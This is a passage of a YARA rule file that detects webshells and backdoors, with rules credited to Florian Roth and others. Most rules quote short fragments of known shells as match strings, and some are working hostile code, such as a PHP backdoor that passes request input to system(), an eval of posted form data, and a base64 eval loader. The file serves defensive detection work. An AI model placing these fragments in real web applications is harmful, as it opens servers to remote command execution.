was = "_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "911195a9b7c010f61b66439d9048f400"
hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
hash3 = "8023394542cddf8aee5dec6072ed02b5"
hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
hash5 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
condition:
1 of them
}
rule SSC_fmlibraryv3 {
meta:
description = "Webshells Auto-generated - file fmlibraryv3.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "c34c248fed6d5a20d8203924a2088acc"
strings:
$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
condition:
all of them
}
rule SSC_EditServer_Webshell {
meta:
description = "Webshells Auto-generated - file EditServer.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "f945de25e0eba3bdaf1455b3a62b9832"
strings:
$s2 = "Server %s Have Been Configured"
$s5 = "The Server Password Exceeds 32 Characters"
$s8 = "9--Set Procecess Name To Inject DLL"
condition:
all of them
}
rule SSC_webshell_Server_Variables {
meta:
description = "Web Shell - file Server Variables.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "47fb8a647e441488b30f92b4d39003d7"
strings:
$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
$s9 = "Variable Name</B></font></p>" fullword
condition:
all of them
}
rule SSC_webshell_webshells_new_JJJsp2 {
meta:
description = "Web shells - generated from file JJJsp2.jsp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "5a9fec45236768069c99f0bfd566d754"
strings:
$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
condition:
1 of them
}
rule SSC_FSO_s_casus15_2 {
meta:
description = "Webshells Auto-generated - file casus15.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8d155b4239d922367af5d0a1b89533a3"
strings:
$s0 = "copy ( $dosya_gonder"
condition:
all of them
}
rule SSC_jspshall_jsp {
meta:
description = "Semi-Auto-generated  - file jspshall.jsp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
strings:
$s0 = "kj021320"
$s1 = "case 'T':systemTools(out);break;"
$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
condition:
2 of them
}
rule SSC_WebShell_lamashell {
meta:
description = "PHP Webshells Github Archive - file lamashell.php"
author = "Florian Roth"
hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
strings:
$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
$s8 = "$curcmd = $_POST['king'];" fullword
$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
$s18 = "<title>lama's'hell v. 3.0</title>" fullword
$s19 = "_|_  O    _    O  _|_" fullword
$s20 = "$curcmd = \"ls -lah\";" fullword
condition:
2 of them
}
rule SSC_webshell_php_fbi {
meta:
description = "Web Shell - file fbi.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "1fb32f8e58c8deb168c06297a04a21f1"
strings:
$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
condition:
all of them
}
rule SSC_webshell_minupload {
meta:
description = "Web Shell - file minupload.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "ec905a1395d176c27f388d202375bdf9"
strings:
$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
condition:
all of them
}
rule SSC_shankar_php_php {
meta:
description = "Semi-Auto-generated  - file shankar.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "6eb9db6a3974e511b7951b8f7e7136bb"
strings:
$sAuthor = "ShAnKaR"
$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
condition:
1 of ($s*) and $sAuthor
}
rule SSC_SoakSoak_Infected_Wordpress {
meta:
description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
reference = "http://goo.gl/1GzWUX"
author = "Florian Roth"
date = "2014/12/15"
score = 60
strings:
$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
$s1 = "function FuncQueueObject()" ascii fullword
$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
condition:
all of ($s*)
}
rule SSC_WebShell_CasuS_1_5 {
meta:
description = "PHP Webshells Github Archive - file CasuS 1.5.php"
author = "Florian Roth"
hash = "7eee8882ad9b940407acc0146db018c302696341"
strings:
$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
$s18 = "if (file_exists(\"F:\\\\\")){" fullword
condition:
1 of them
}
rule SSC_webshell_ASP_cmd {
meta:
description = "Web Shell - file cmd.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "97af88b478422067f23b001dd06d56a9"
strings:
$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
condition:
all of them
}
rule SSC_icyfox007v1_10_rar_Folder_asp {
meta:
description = "Webshells Auto-generated - file asp.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "2c412400b146b7b98d6e7755f7159bb9"
strings:
$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
condition:
all of them
}
rule SSC_PhpShell {
meta:
description = "Webshells Auto-generated - file PhpShell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "539baa0d39a9cf3c64d65ee7a8738620"
strings:
$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
condition:
all of them
}
rule SSC_webshell_Worse_Linux_Shell {
meta:
description = "Web Shell - file Worse Linux Shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "8338c8d9eab10bd38a7116eb534b5fa2"
strings:
$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
condition:
all of them
}
rule SSC_FSO_s_test {
meta:
description = "Webshells Auto-generated - file test.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "82cf7b48da8286e644f575b039a99c26"
strings:
$s0 = "$yazi = \"test\" . \"\\r\\n\";"
$s2 = "fwrite ($fp, \"$yazi\");"
condition:
all of them
}
rule SSC_HYTop_DevPack_server {
meta:
description = "Webshells Auto-generated - file server.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1d38526a215df13c7373da4635541b43"
strings:
$s0 = "<!-- PageServer Below -->"
condition:
all of them
}
rule SSC_PHP_sh {
meta:
description = "Webshells Auto-generated - file sh.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1e9e879d49eb0634871e9b36f99fe528"
strings:
$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
condition:
all of them
}
rule SSC_r57shell_2 {
meta:
description = "Webshells Auto-generated - file r57shell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8023394542cddf8aee5dec6072ed02b5"
strings:
$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
condition:
all of them
}
rule SSC_webshell_jsp_cmdjsp_2 {
meta:
description = "Web Shell - file cmdjsp.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "1b5ae3649f03784e2a5073fa4d160c8b"
strings:
$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0032 {
meta:
description = "Semi-Auto-generated  - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_nixrem_php_php_c99shell_v1_0_php_php_c99php_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_php"
hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash3 = "f3ca29b7999643507081caab926e2e74"
strings:
$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
$s1 = "$ret = posix_kill($pid,$sig);" fullword
$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
$s3 = "$i = $nixpasswd;" fullword
condition:
2 of them
}
rule SSC_zacosmall_php {
meta:
description = "Semi-Auto-generated  - file zacosmall.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5295ee8dc2f5fd416be442548d68f7a6"
strings:
$s0 = "rand(1,99999);$sj98"
$s1 = "$dump_file.='`'.$rows2[0].'`"
$s3 = "filename=\\\"dump_{$db_dump}_${table_d"
condition:
2 of them
}
rule SSC_WebShell_Generic_PHP_7 {
meta:
description = "PHP Webshells Github Archive - from files Mysql interface v1.0.php, MySQL Web Interface Version 0.8.php, Mysql_interface_v1.0.php, MySQL_Web_Interface_Version_0.8.php"
author = "Florian Roth"
super_rule = 1
hash0 = "de98f890790756f226f597489844eb3e53a867a9"
hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
hash3 = "715f17e286416724e90113feab914c707a26d456"
strings:
$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
$s4 = "if( $action == \"dumpTable\" )" fullword
condition:
2 of them
}
rule SSC_webshell_PHP_c37 {
meta:
description = "Web Shell - file c37.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d01144c04e7a46870a8dd823eb2fe5c8"
strings:
$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
condition:
all of them
}
rule SSC_portlessinst {
meta:
description = "Webshells Auto-generated - file portlessinst.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "74213856fc61475443a91cd84e2a6c2f"
strings:
$s2 = "Fail To Open Registry"
$s3 = "f<-WLEggDr\""
$s6 = "oMemoryCreateP"
condition:
all of them
}
rule SSC_webshell_201_3_ma_download {
meta:
description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "a7e25b8ac605753ed0c438db93f6c498"
hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
strings:
$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
condition:
all of them
}
rule SSC_WebShell_simple_backdoor {
meta:
description = "PHP Webshells Github Archive - file simple-backdoor.php"
author = "Florian Roth"
hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
strings:
$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
$s3 = "        echo \"</pre>\";" fullword
$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
$s5 = "        echo \"<pre>\";" fullword
$s6 = "if(isset($_REQUEST['cmd'])){" fullword
$s7 = "        die;" fullword
$s8 = "        system($cmd);" fullword
condition:
all of them
}
rule SSC_HYTop2006_rar_Folder_2006 {
meta:
description = "Webshells Auto-generated - file 2006.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "c19d6f4e069188f19b08fa94d44bc283"
strings:
$s6 = "strBackDoor = strBackDoor "
condition:
all of them
}
rule SSC_multiple_webshells_0006 {
meta:
description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_c99shell_v1_0_php_php_c99php_SsEs_php_php_ctt_sh_php_php"
hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
hash3 = "671cad517edd254352fe7e0c7c981c39"
strings:
$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
condition:
2 of them
}
rule SSC_FSO_s_EFSO_2 {
meta:
description = "Webshells Auto-generated - file EFSO_2.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a341270f9ebd01320a7490c12cb2e64c"
strings:
$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
condition:
all of them
}
rule SSC_Mithril_dllTest {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
strings:
$s0 = "please enter the password:"
$s3 = "\\dllTest.pdb"
condition:
all of them
}
rule SSC_bin_wuaus {
meta:
description = "Webshells Auto-generated - file wuaus.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "46a365992bec7377b48a2263c49e4e7d"
strings:
$s1 = "9(90989@9V9^9f9n9v9"
$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
$s3 = ";(=@=G=O=T=X=\\="
$s4 = "TCP Send Error!!"
$s5 = "1\"1;1X1^1e1m1w1~1"
$s8 = "=$=)=/=<=Y=_=j=p=z="
condition:
all of them
}
rule SSC_peek_a_boo {
meta:
description = "Webshells Auto-generated - file peek-a-boo.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "aca339f60d41fdcba83773be5d646776"
strings:
$s0 = "__vbaHresultCheckObj"
$s1 = "\\VB\\VB5.OLB"
$s2 = "capGetDriverDescriptionA"
$s3 = "__vbaExceptHandler"
$s4 = "EVENT_SINK_Release"
$s8 = "__vbaErrorOverflow"
condition:
all of them
}
rule SSC_multiple_webshells_0023 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "9c5bb5e3a46ec28039e8986324e42792"
hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash4 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "$sqlquicklaunch[] = array(\""
$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
condition:
all of them
}
rule SSC_multiple_webshells_0013 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "911195a9b7c010f61b66439d9048f400"
hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
strings:
$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
$s2 = "rst.void.ru"
condition:
3 of them
}
rule SSC_pws_php_php {
meta:
description = "Semi-Auto-generated  - file pws.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
strings:
$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
condition:
2 of them
}
rule SSC_WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php {
meta:
description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
author = "Florian Roth"
super_rule = 1
hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
hash3 = "4f83bc2836601225a115b5ad54496428a507a361"
strings:
$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
condition:
2 of them
}
rule SSC_multiple_webshells_0017 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "9c5bb5e3a46ec28039e8986324e42792"
hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
hash3 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
condition:
1 of them
}
rule SSC_pHpINJ_php_php {
meta:
description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "d7a4b0df45d34888d5a09f745e85733f"
strings:
$s1 = "News Remote PHP Shell Injection"
$s3 = "Php Shell <br />" fullword
$s4 = "<input type = \"text\" name = \"url\" value = \""
condition:
2 of them
}
rule SSC_webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
meta:
description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
hash3 = "40a1f840111996ff7200d18968e42cfe"
hash4 = "e0202adff532b28ef1ba206cf95962f2"
hash5 = "802f5cae46d394b297482fd0c27cb2fc"
strings:
$s0 = "$this -> addFile($content, $filename);" fullword
$s3 = "function addFile($data, $name, $time = 0) {" fullword
$s8 = "function unix2DosTime($unixtime = 0) {" fullword
$s9 = "foreach($filelist as $filename){" fullword
condition:
all of them
}
rule SSC_DefaceKeeper_0_2_php {
meta:
description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "713c54c3da3031bc614a8a55dccd7e7f"
strings:
$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
condition:
1 of them
}
rule SSC_Webshell_r57shell_2 {
meta:
description = "Detects Webshell R57"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
strings:
$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
condition:
filesize < 900KB and all of them
}
rule SSC_PHP_Cloaked_Webshell_SuperFetchExec {
meta:
description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
reference = "http://goo.gl/xFvioC"
author = "Florian Roth"
score = 50
strings:
$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
condition:
$s0
}
rule SSC_webshell_phpkit_1_0_odd {
meta:
description = "Web Shell - file odd.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
strings:
$s0 = "include('php://input');" fullword
$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
condition:
all of them
}
rule SSC_xssshell_save {
meta:
description = "Webshells Auto-generated - file save.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "865da1b3974e940936fe38e8e1964980"
strings:
$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
$s5 = "VictimID = fm_NStr(Victims(i))"
condition:
all of them
}
rule SSC_settings : webshell {
meta:
description = "Laudanum Injector Tools - file settings.php"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
strings:
$s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "<li>Reverse Shell - " fullword ascii /* PEStudio Blacklist: strings */
$s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii /* PEStudio Blacklist: strings */
condition:
filesize < 13KB and all of them
}
rule SSC_WinX_Shell_html {
meta:
description = "Semi-Auto-generated  - file WinX Shell.html.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "17ab5086aef89d4951fe9b7c7a561dda"
strings:
$s0 = "WinX Shell"
$s1 = "Created by greenwood from n57"
$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
condition:
2 of them
}
rule SSC_WebShell_php_webshells_aspydrv {
meta:
description = "PHP Webshells Github Archive - file aspydrv.php"
author = "Florian Roth"
hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
strings:
$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
$s20 = "' ---Copy Too Folder routine Start" fullword
condition:
3 of them
}
rule SSC_RkNTLoad {
meta:
description = "Webshells Auto-generated - file RkNTLoad.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "262317c95ced56224f136ba532b8b34f"
strings:
$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
$s2 = "5pur+virtu!"
$s3 = "ugh spac#n"
$s4 = "xcEx3WriL4"
$s5 = "runtime error"
$s6 = "loseHWait.Sr."
$s7 = "essageBoxAw"
$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
condition:
all of them
}
rule SSC_webshell_jsp_up {
meta:
description = "Web Shell - file up.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "515a5dd86fe48f673b72422cccf5a585"
strings:
$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
condition:
all of them
}
rule SSC_FSO_s_reader {
meta:
description = "Webshells Auto-generated - file reader.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
strings:
$s2 = "mailto:mailbomb@hotmail."
condition:
all of them
}
rule SSC_WebShell_cgi {
meta:
description = "Semi-Auto-generated  - file WebShell.cgi.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "bc486c2e00b5fc3e4e783557a2441e6f"
strings:
$s0 = "WebShell.cgi"
$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
condition:
all of them
}
rule SSC_multiple_webshells_0003 {
meta:
description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_network_php_php_xinfo_php_php_nfm_php_php"
hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
hash1 = "2601b6fc1579f263d2f3960ce775df70"
hash2 = "401fbae5f10283051c39e640b77e4c26"
strings:
$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
condition:
all of them
}
rule SSC_webshell_webshell_cnseay_x {
meta:
description = "Web Shell - file webshell-cnseay-x.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a0f9f7f5cd405a514a7f3be329f380e5"
strings:
$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
condition:
all of them
}
rule SSC_webshell_ironshell {
meta:
description = "Web Shell - file ironshell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "8bfa2eeb8a3ff6afc619258e39fded56"
strings:
$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
condition:
all of them
}
rule SSC_webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
meta:
